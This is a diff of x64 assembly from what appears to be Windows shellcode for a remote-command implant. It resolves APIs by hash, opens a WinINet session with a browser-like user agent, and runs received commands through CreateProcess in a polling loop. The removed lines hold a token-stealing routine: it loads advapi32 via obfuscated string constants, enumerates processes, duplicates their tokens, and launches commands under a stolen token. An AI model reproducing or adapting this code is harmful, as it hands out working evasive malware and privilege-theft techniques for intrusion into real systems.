@@ -127,35 +127,6 @@ load_wininet:
     call lookup_api
     mov [rbp - 112], rax
 
-load_advapi32:
-    mov rax, 0x3233697061766461
-    mov [rbp - 320], rax
-    mov eax, 0x6c6c642e
-    mov [rbp - 312], eax
-    mov byte ptr [rbp - 308], 0
-
-    lea rcx, [rbp - 320]
-    sub rsp, 32
-    call [rbp - 8]
-    add rsp, 32
-
-    mov [rbp - 248], rax
-
-    mov rcx, rax
-    mov r8d, 0x591ea70f
-    call lookup_api
-    mov [rbp - 224], rax
-
-    mov rcx, [rbp - 248]
-    mov r8d, 0x3a55bbb2
-    call lookup_api
-    mov [rbp - 232], rax
-
-    mov rcx, [rbp - 248]
-    mov r8d, 0xe40b58f7
-    call lookup_api
-    mov [rbp - 240], rax
-
 internet_open:
     mov rax, 0x2f616c6c697a6f4d
     mov [rbp - 320], rax
@@ -176,104 +147,6 @@ internet_open:
     test rax, rax
     jz executor_exit
     mov r14, rax
-
-    mov qword ptr [rbp - 256], 0
-
-steal_token:
-    mov ecx, 2
-    xor edx, edx
-    sub rsp, 32
-    call [rbp - 200]
-    add rsp, 32
-    cmp rax, -1
-    je executor_loop
-    mov [rbp - 552], rax
-
-    mov dword ptr [rbp - 1024], 568
-
-    lea rdx, [rbp - 1024]
-    mov rcx, [rbp - 552]
-    sub rsp, 32
-    call [rbp - 208]
-    add rsp, 32
-    test eax, eax
-    jz close_snapshot
-
-try_process:
-    mov eax, [rbp - 1024 + 8]
-    test eax, eax
-    jz next_process
-
-    mov ecx, 0x400
-    xor edx, edx
-    mov r8d, [rbp - 1024 + 8]
-    sub rsp, 32
-    call [rbp - 192]
-    add rsp, 32
-    test rax, rax
-    jz next_process
-    mov [rbp - 560], rax
-
-    mov rcx, rax
-    mov edx, 2
-    lea r8, [rbp - 568]
-    sub rsp, 32
-    call [rbp - 224]
-    add rsp, 32
-    test eax, eax
-    jz close_process
-
-    mov rcx, [rbp - 568]
-    mov edx, 0x02000000
-    xor r8, r8
-    mov r9d, 2
-    sub rsp, 48
-    mov dword ptr [rsp + 32], 1
-    lea rax, [rbp - 256]
-    mov [rsp + 40], rax
-    call [rbp - 232]
-    add rsp, 48
-    test eax, eax
-    jz close_token
-
-    mov rcx, [rbp - 568]
-    sub rsp, 32
-    call [rbp - 24]
-    add rsp, 32
-
-    mov rcx, [rbp - 560]
-    sub rsp, 32
-    call [rbp - 24]
-    add rsp, 32
-
-    jmp close_snapshot
-
-close_token:
-    mov rcx, [rbp - 568]
-    sub rsp, 32
-    call [rbp - 24]
-    add rsp, 32
-
-close_process:
-    mov rcx, [rbp - 560]
-    sub rsp, 32
-    call [rbp - 24]
-    add rsp, 32
-
-next_process:
-    lea rdx, [rbp - 1024]
-    mov rcx, [rbp - 552]
-    sub rsp, 32
-    call [rbp - 216]
-    add rsp, 32
-    test eax, eax
-    jnz try_process
-
-close_snapshot:
-    mov rcx, [rbp - 552]
-    sub rsp, 32
-    call [rbp - 24]
-    add rsp, 32
 
 executor_loop:
     mov rcx, 3000
@@ -424,40 +297,6 @@ copy_command:
     test al, al
     jnz copy_command
 
-    lea rsi, [rbp - 4096]
-    lea rdi, [rbp - 7168]
-convert_to_wide:
-    lodsb
-    stosb
-    mov byte ptr [rdi], 0
-    inc rdi
-    test al, al
-    jnz convert_to_wide
-
-    mov rax, [rbp - 256]
-    test rax, rax
-    jz fallback_createprocess
-
-    mov rcx, [rbp - 256]
-    xor edx, edx
-    xor r8, r8
-    lea r9, [rbp - 7168]
-
-    sub rsp, 72
-    xor rax, rax
-    mov qword ptr [rsp + 32], rax
-    mov qword ptr [rsp + 40], rax
-    mov qword ptr [rsp + 48], rax
-    lea rax, [rbp - 504]
-    mov qword ptr [rsp + 56], rax
-    lea rax, [rbp - 528]
-    mov qword ptr [rsp + 64], rax
-
-    call [rbp - 240]
-    add rsp, 72
-    jmp check_process_result
-
-fallback_createprocess:
     xor rcx, rcx
     lea rdx, [rbp - 4096]
     xor r8, r8
@@ -476,8 +315,6 @@ fallback_createprocess:
 
     call [rbp - 40]
     add rsp, 80
-
-check_process_result:
 
     test eax, eax
     jz cleanup_pipes
